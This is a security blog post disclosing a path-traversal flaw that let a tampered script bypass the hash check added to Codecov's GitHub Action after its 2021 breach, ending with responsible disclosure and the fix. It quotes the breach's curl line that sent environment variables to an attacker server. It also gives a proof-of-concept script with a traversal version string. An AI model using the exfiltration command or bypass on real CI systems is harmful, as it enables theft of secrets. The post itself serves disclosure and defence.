---
layout: post
title: "Hash Verification Bypass in Codecov GitHub Action"
---
> Codecov, a test coverage service, disclosed a [considerable supply-chain attack](https://finance.yahoo.com/news/codecov-hackers-breached-hundreds-restricted-234749553.html) on April 15th.
> The preventative hash verification measure added post-fact was trivially vulnerable.


As per Codecov's [own disclosure](https://about.codecov.io/security-update/), the attack involved compromising the hosting of their code uploader [bash script](http://codecov.io/bash) (warning, link downloads file) to add a single line slurping up environment variables to an unknown server:

```bash
curl -sm 0.5 -d “$(git remote -v)<<<<<< ENV $(env)” http://<redacted>/upload/v2 || true
```

The GitHub Actions codecov uploader, despite being written in typescript, actually just downloads the bash script and calls `exec` on it.

## Hash Verification

After disclosing the breach, Codecov engineers [added some hash verification logic](https://github.com/codecov/codecov-action/pull/282) to avoid blindly executing malicious bash code from the web.

I looked at the PR diff out of curiosity, and found a reviewer comment asking why the logic was computing and checking SHA1, SHA256, _and_ SHA512. The author's answer of "although it is unlikely that one would match and another wouldn't, I'd prefer to be thorough" felt like security mysticism so I looked closer for any obvious errors.

`calculateChecksum()`, aptly named, calculates one of the SHA hashes by number using the standard library hash function.

```js
const calculateChecksum = (body, i) => {
  const shasum = crypto.createHash(`sha${i}`);
  shasum.update(body);
  return `${shasum.digest('hex')}  codecov`;
};
```

`retrieveChecksum()` downloads the corresponding hashes that have been checked into the bash script repository.
Downloading hashes smells funny from a security perspective, but I suppose if we're running this typescript on a GitHub Actions machine and couldn't trust GitHub's hosting, we also couldn't trust the script we were currently running. If anything, downloading the bash script itself from GitHub's hosting might have avoided this whole compromise in the first place?

The [SHA1 for 1.0.1](https://raw.githubusercontent.com/codecov/codecov-bash/1.0.1/SHA1SUM), then, contains `0ddc61a9408418c73b19a1375f63bb460dc947a8  codecov`.

```js
export const retrieveChecksum = async (version, encryption) => {
  const url = `https://raw.githubusercontent.com/codecov/codecov-bash/${version}/SHA${encryption}SUM`;
  const response = await request({
    maxAttempts: 10,
    timeout: 3000,
    url: url,
  });

  if (response.statusCode != 200) {
    core.warning(
        `Codecov could not retrieve checksum SHA${encryption} at ${url}`,
    );
    return '';
  }
  return response.body;
};
```

In order to know which versioned hash to check against, the code parses the `VERSION="1.0.2"` line from the script like so:
```js
const getVersion = (body) => {
  const regex = /VERSION="(.*)+"/g;
  const match = regex.exec(body);
  return match ? match[1] : null;
};
```

This string is parsed using a particularly generous regex. Oh no.

## Bypass

I modified the official bash uploader by adding a line of custom code (in this case an `echo`, but just as easily the malicious `curl` of the original breach) and wrote a custom version string:

```bash
#!/usr/bin/env bash

# Apache License Version 2.0, January 2004
# https://github.com/codecov/codecov-bash/blob/master/LICENSE

set -e +o pipefail

VERSION="../../revan/codecov-bash/1.0.1"

echo "doing nefarious things" || true
```

I hosted the script as a [gist](https://gist.github.com/revan/4f24c5336f625d9189f1bcf8f666d4ca), but in an attack scenario the malicious bash file would be once again hosted from their compromised server.

(Aside, yes, the original script sets `+o pipefail` to explicitly _disable_ a disabled-by-default safety feature. Your scripts should [pretty much always start with `set -euo pipefail`](http://redsymbol.net/articles/unofficial-bash-strict-mode/).)

I then forked the codecov-bash repository, and made a single commit [updating the checked in hashes](https://github.com/revan/codecov-bash/commit/48544c3c075b8828cea1a9a91913403da080464a) to be the corresponding hashes of my malicious uploader script.

You can probably put together the parts here, but to summarize: if the new hash-aware GitHub Actions client were served my modified bash file, `getVersion()` would happily return `"../../revan/codecov-bash/1.0.1"`, which `retrieveChecksum()` would interpolate into the url string.
The `../` in the url is interpreted to mean "up a directory" just like in the terminal, backing out of the official codecov repository and into mine.

Either my browser or blog software is eagerly parsing the `../` out of any link, but paste this to see for yourselves:

```
https://raw.githubusercontent.com/codecov/codecov-bash/../../revan/codecov-bash/1.0.1/SHA1SUM
```

The client locally calculates the three hashes, which match the hashes in my repository, and proceeds to execute the script:

```
$ node dist/index.js
[command]/bin/bash codecov.sh -n  -F  -Q github-action
doing nefarious things

  _____          _
 / ____|        | |
| |     ___   __| | ___  ___ _____   __
| |    / _ \ / _` |/ _ \/ __/ _ \ \ / /
| |___| (_) | (_| |  __/ (_| (_) \ V /
 \_____\___/ \__,_|\___|\___\___/ \_/
                              Bash-../../revan/codecov-bash/1.0.1


==> git version 2.31.0 found
```

## Resolution

Because I'm not on a resolute mission to spread chaos, I disclosed this vulnerability to Codecov security@ [per their policy](https://about.codecov.io/security/#codecov-responsible-disclosure-policy) on April 19th.
It was acknowledged same day, and a fix [tightening the regex and hardcoding the hashes](https://github.com/codecov/codecov-action/pull/287) was merged the next.

The code still parses an untrusted downloaded file to extract the version, which rubs me wrong since they could instead check against the `n` most recent hashes, but I don't see any security issues beyond a (pointless) DOS or potential vulnerability in the standard library regex engine.

Security is hard and I only know just enough to know not to trust my own knowledge, but this episode hasn't left me feeling impressed.
